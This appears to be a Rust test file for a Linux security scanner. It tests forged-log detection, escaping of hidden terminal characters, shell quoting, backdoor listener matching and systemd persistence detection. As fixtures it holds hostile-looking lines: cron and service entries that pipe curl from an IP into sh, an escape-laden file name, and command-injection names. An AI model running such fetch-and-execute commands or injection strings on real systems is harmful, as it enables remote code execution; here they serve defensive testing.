//! What another program writes must not pose as something else: log lines, names in reports and
//! commands to copy, a program named after another one, a service in a folder nobody looks in.

use scanner::baseline::{self, Baseline, ListenerKey};
use scanner::display;
use scanner::finding::{Finding, Severity};
use scanner::modules::auth_logs::{parse_line, unconfirmed_lines, Kind};
use scanner::modules::common::shq;
use scanner::modules::journal::{from_real_source, parse_entry, queries, to_line, Entry};
use scanner::modules::net_proc::Connection;
use scanner::modules::{Collector, Inventory};
use scanner::report::Report;
use scanner::{run_scan, Config, ModuleId, ScanOptions, SysRoot};
use std::fs;
use std::path::Path;
use std::process::Command;

fn entry(tag: &str, uid: u32, exe: &str, unit: &str) -> Entry {
    Entry { time: 1_767_000_000_000_000, host: "h".into(), tag: tag.into(), pid: "7".into(), message: "Accepted password for root from 203.0.113.9 port 22 ssh2".into(), uid: Some(uid), exe: exe.into(), unit: unit.into(), ..Entry::default() }
}

#[test]
fn only_the_programs_that_log_logins_are_believed() {
    // sshd runs as root; so do useradd and the login screens
    assert!(from_real_source(&entry("sshd-session", 0, "/usr/lib/openssh/sshd-session", "ssh.service")));
    // logger, and a copy of it named sshd, run by a person
    assert!(!from_real_source(&entry("sshd", 1000, "/usr/bin/logger", "")));
    assert!(!from_real_source(&entry("sshd", 1000, "/tmp/sshd", "")));
    assert!(!from_real_source(&entry("sshd", 1000, "", "")), "a program that had already exited");
    assert!(!from_real_source(&Entry { uid: None, ..entry("sshd", 0, "", "") }));
    // programs that log as the person, only under their own name
    assert!(from_real_source(&entry("sudo", 1000, "/usr/bin/sudo", "")));
    assert!(from_real_source(&entry("su", 1000, "/usr/bin/su", "")));
    assert!(!from_real_source(&entry("sshd", 1000, "/usr/bin/sudo", "")));
    assert!(!from_real_source(&entry("useradd", 1000, "/usr/bin/su", "")));
    assert!(!from_real_source(&entry("sudo", 1000, "/home/anna/bin/sudo", "")));
    // polkit is known by its service, which a person cannot start
    assert!(from_real_source(&entry("polkitd", 990, "/usr/lib/polkit-1/polkitd", "polkit.service")));
    assert!(!from_real_source(&entry("polkitd", 1000, "/usr/lib/polkit-1/polkitd", "user@1000.service")));
    let locker = format!("/usr/lib/{}-linux-gnu/libexec/kscreenlocker_greet", std::env::consts::ARCH);
    assert!(from_real_source(&entry("kscreenlocker_greet", 1000, "/usr/lib/x86_64-linux-gnu/libexec/kscreenlocker_greet", "")));
    assert!(!from_real_source(&entry("sshd", 1000, &locker, "")));
    assert!(!from_real_source(&entry("swaylock", 1000, "/home/anna/swaylock", "")));
    assert!(!from_real_source(&entry("kscreenlocker_greet", 1000, "/usr/lib/a/b/libexec/kscreenlocker_greet", "")));
    // each group is asked for by the journal's own fields, so a flood cannot push it out
    let asked = queries();
    assert!(asked.iter().all(|(_, m)| m.iter().any(|x| x.starts_with("_UID=") || x.starts_with("_EXE=") || x.starts_with("_SYSTEMD_UNIT="))));
    assert!(asked.iter().any(|(_, m)| m.contains(&format!("_EXE={locker}"))));
}

#[test]
fn journal_entries_become_log_lines() {
    let json = r#"{"__REALTIME_TIMESTAMP":"1767000000000000","__CURSOR":"c","_HOSTNAME":"h","SYSLOG_IDENTIFIER":"sshd-session","_PID":"7","_UID":"0","MESSAGE":"Accepted publickey for anna from 192.0.2.4 port 1 ssh2"}"#;
    let line = to_line(&parse_entry(json).expect("entry"));
    let event = parse_line(&line).expect("event");
    assert_eq!(event.kind, Kind::SshAccepted { method: "publickey".into() });
    assert_eq!((event.user.as_str(), event.source.as_str()), ("anna", "192.0.2.4"));
    // text that is not printable comes as bytes; several lines stay one message
    let json = r#"{"__REALTIME_TIMESTAMP":"1767000000000000","SYSLOG_IDENTIFIER":"sudo","MESSAGE":[97,10,98],"_UID":"1000"}"#;
    let line = to_line(&parse_entry(json).expect("entry"));
    assert!(line.ends_with("sudo: a b"), "{line}");
    // lines from the wrong program are shown, and never raise an alarm
    let mut col = Collector::default();
    unconfirmed_lines(&[(to_line(&entry("sshd", 1000, "/usr/bin/logger", "")), "/usr/bin/logger".into())], &mut col);
    assert_eq!(col.findings.len(), 1);
    assert_eq!((col.findings[0].rule.as_str(), col.findings[0].severity), ("AUTH-LOG-UNCONFIRMED", Severity::Low));
    assert!(col.findings[0].evidence.contains("/usr/bin/logger"));
}

fn write(root: &Path, path: &str, text: &str) {
    let full = root.join(path.trim_start_matches('/'));
    fs::create_dir_all(full.parent().expect("parent")).expect("mkdir");
    fs::write(full, text).expect("write");
}

fn scan(root: &Path, module: ModuleId) -> Report {
    let options = ScanOptions { modules: vec![module], ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &options, &|_| {})
}

#[test]
fn findings_from_auth_log_say_they_can_be_forged() {
    let dir = tempfile::tempdir().expect("tempdir");
    write(dir.path(), "/var/log/auth.log", "2026-01-02T10:00:00+01:00 h sshd-session[1]: Accepted password for root from 203.0.113.9 port 22 ssh2\n");
    let report = scan(dir.path(), ModuleId::AuthLogs);
    assert!(!report.findings.is_empty());
    assert!(report.findings.iter().all(|f| f.description.contains("may be forged")), "{:?}", report.findings);
    assert!(report.notes.iter().any(|n| n.contains("can be forged")));
}

/// A file name that erases lines, ends bracketed paste and reads backwards.
const SLY: &str = "x\u{1b}[1A\u{1b}[2K\u{1b}[201~\u{202e}gpj.sh\r\u{9b}\u{7f}";

#[test]
fn hidden_characters_are_written_out_everywhere_a_person_reads() {
    let clean = |s: &str| !s.chars().any(|c| c != '\n' && display::is_hidden(c));
    assert_eq!(display::line("a\u{1b}[2K\u{202e}b\nc\td"), "a\\x1b[2K\\u202eb\\nc\\td");
    assert_eq!(display::text("one\r\ntwo\tthree\r"), "one\ntwo\tthree\\r");
    assert_eq!(display::line("Räksmörgås 🙂"), "Räksmörgås 🙂");
    let mut report = Report { hostname: SLY.into(), notes: vec![SLY.into()], ..Report::default() };
    report.findings.push(Finding::new(Severity::High, "m", "R", SLY).evidence(format!("{SLY}\nsecond")).description(SLY).verify(format!("cat {SLY}")));
    report.finalize();
    for shown in [report.to_text(false), report.to_html(), report.summary_line()] {
        assert!(clean(&shown), "{shown:?}");
        assert!(shown.contains("\\x1b"), "{shown}");
    }
    // JSON keeps the data as it is, only written so that "cat" shows it
    let json = report.to_json().expect("json");
    assert!(clean(&json), "{json:?}");
    let back: Report = serde_json::from_str(&json).expect("parse");
    assert_eq!(back.findings, report.findings);
    // a scan itself hands on findings that are already safe to copy
    let dir = tempfile::tempdir().expect("tempdir");
    write(dir.path(), "/etc/cron.d/job", "* * * * * root curl http://203.0.113.9/\u{1b}[2K | sh\n");
    let report = scan(dir.path(), ModuleId::Persistence);
    assert!(report.has_rule("PERS-CRON-CMD"));
    assert!(report.findings.iter().all(|f| clean(&f.title) && clean(&f.evidence) && f.verify.iter().all(|v| clean(v) && !v.contains('\n'))));
}

#[test]
fn quoted_names_reach_the_shell_as_they_are_and_run_nothing() {
    // harmless stand-ins for a command smuggled into a name
    let names = ["';echo INJECTED;'", "a\\';echo INJECTED;'", "back\\slash\\", "$(echo INJECTED) `echo INJECTED`", "with space!", "", "x\u{1b}[201~\necho INJECTED", "it's\u{202e}!\\"];
    for name in names {
        let quoted = shq(name);
        assert!(!quoted.chars().any(display::is_hidden), "{quoted:?}");
        let plain = !name.chars().any(display::is_hidden);
        // bash reads every form; dash and fish read the single-quoted one
        for shell in ["/usr/bin/bash", "/bin/dash", "/usr/bin/fish"] {
            if !Path::new(shell).exists() || !plain && shell != "/usr/bin/bash" {
                continue;
            }
            let mut command = Command::new(shell);
            if shell.ends_with("fish") {
                command.arg("--no-config");
            }
            let out = command.arg("-c").arg(format!("printf %s {quoted}")).output().expect("run");
            assert_eq!(String::from_utf8_lossy(&out.stdout), name, "{shell}: {quoted}");
        }
    }
}

fn listener(port: u16, process: &str, exe: &str) -> Connection {
    Connection { proto: "udp".into(), local_addr: "0.0.0.0".into(), local_port: port, remote_addr: String::new(), remote_port: 0, state: "LISTEN".into(), listening: true, uid: 1000, inode: 0, pid: Some(1), process: Some(process.into()), exe: Some(exe.into()), cmdline: None }
}

fn with_listeners(list: Vec<Connection>) -> Report {
    Report { modules: vec!["net_proc".into()], inventory: Inventory { connections: list, ..Inventory::default() }, ..Report::default() }
}

#[test]
fn a_program_is_known_by_its_path_not_its_name() {
    let real = "/usr/bin/kdeconnectd";
    let then = Baseline::from_report(&with_listeners(vec![listener(40000, "kdeconnectd", real)]));
    assert_eq!(then.listeners, [ListenerKey { proto: "udp".into(), port: 40000, process: "kdeconnectd".into(), exe: real.into() }]);
    let new_ports = |base: &Baseline, now: Connection| baseline::compare(base, &with_listeners(vec![now]).inventory, &["net_proc".into()]).0;
    // the real program on another random port
    assert!(new_ports(&then, listener(41000, "kdeconnectd", real)).is_empty());
    assert!(new_ports(&then, listener(41000, "kdeconnectd", "/usr/bin/kdeconnectd (deleted)")).is_empty(), "upgraded while running");
    // a back door of the same name
    let found = new_ports(&then, listener(41000, "kdeconnectd", "/home/anna/.cache/kdeconnectd"));
    assert_eq!(found.len(), 1);
    assert!(found[0].evidence.contains("/home/anna/.cache/kdeconnectd"));
    // an AppImage is mounted somewhere new at every start
    let image = Baseline::from_report(&with_listeners(vec![listener(40000, "app", "/tmp/.mount_appAbC/usr/bin/app")]));
    assert!(new_ports(&image, listener(41000, "app", "/tmp/.mount_appXyZ/usr/bin/app")).is_empty());
    // an older baseline only has names: believed for installed programs only
    let mut old = then.clone();
    old.listeners[0].exe = String::new();
    assert!(new_ports(&old, listener(41000, "kdeconnectd", real)).is_empty());
    assert_eq!(new_ports(&old, listener(41000, "kdeconnectd", "/home/anna/kdeconnectd")).len(), 1);
    // the command to copy cannot run what the name says
    let sly = new_ports(&then, listener(80, "';id;'", "/tmp/x"));
    assert_eq!(sly[0].verify, [format!("ss -tulpn | grep -F -- {}", shq("';id;'"))]);
}

#[test]
fn a_clean_root_scan_gives_older_baselines_the_program_paths() {
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("baseline.json");
    let report = Report { scan_root: "/".into(), running_as_root: true, ..with_listeners(vec![listener(1716, "kdeconnectd", "/usr/bin/kdeconnectd"), listener(8000, "tool", "/home/anna/tool")]) };
    let mut old = Baseline::from_report(&report);
    old.listeners.iter_mut().for_each(|l| l.exe = String::new());
    old.save(&path).expect("save");
    scanner::autobaseline::auto_save_to(&report, &path);
    let now = Baseline::load(&path).expect("load");
    let exe = |name: &str| now.listeners.iter().find(|l| l.process == name).map(|l| l.exe.clone());
    assert_eq!(exe("kdeconnectd").as_deref(), Some("/usr/bin/kdeconnectd"));
    assert_eq!(exe("tool").as_deref(), Some(""), "a program in a home folder is not taken over");
    assert_eq!(now.listeners.len(), 2);
}

#[test]
fn services_in_every_folder_systemd_reads() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nanna:x:1000:1000::/home/anna:/bin/bash\n");
    let bad = "[Service]\nExecStart=/bin/sh -c 'curl http://203.0.113.9/x | sh'\n";
    let units = [
        "/run/user/1000/systemd/user/runtime.service",
        "/etc/xdg/systemd/user/xdg.service",
        "/usr/local/lib/systemd/user/local.service",
        "/etc/systemd/system.control/control.service",
        "/run/systemd/system.control/passing.service",
        "/home/anna/.config/systemd/user.control/mine.service",
    ];
    for unit in units {
        write(root, unit, bad);
    }
    write(root, "/home/anna/.config/systemd/user.control/dbus.service.d/50-x.conf", "[Service]\nExecStartPre=/bin/sh -c 'curl http://203.0.113.9/y | sh'\n");
    // a service linked in until logout
    write(root, "/home/anna/.cache/linked.service", "[Service]\nExecStart=/usr/bin/true\n");
    std::os::unix::fs::symlink("/home/anna/.cache/linked.service", root.join("run/user/1000/systemd/user/linked.service")).expect("link");
    let report = scan(root, ModuleId::Persistence);
    let reported = |name: &str| report.findings.iter().any(|f| f.title.contains(name));
    for unit in units {
        let name = unit.rsplit('/').next().expect("name");
        assert!(report.findings.iter().any(|f| f.rule == "PERS-SYSTEMD-EXEC" && f.title.ends_with(name)), "{name}: {:?}", report.findings.iter().map(|f| &f.title).collect::<Vec<_>>());
    }
    assert!(report.findings.iter().any(|f| f.rule == "PERS-SYSTEMD-DROPIN" && f.evidence.contains("user.control/dbus.service.d")));
    assert!(reported("until logout: linked.service"));
    // what is gone after logout stays out of the baseline; the rest goes in
    let files = &report.inventory.persistence_files;
    assert!(!files.keys().any(|f| f.starts_with("/run/user/") || f.starts_with("/run/systemd/system.control")), "{files:?}");
    assert!(files.contains_key("/etc/xdg/systemd/user/xdg.service") && files.contains_key("/etc/systemd/system.control/control.service"));
}
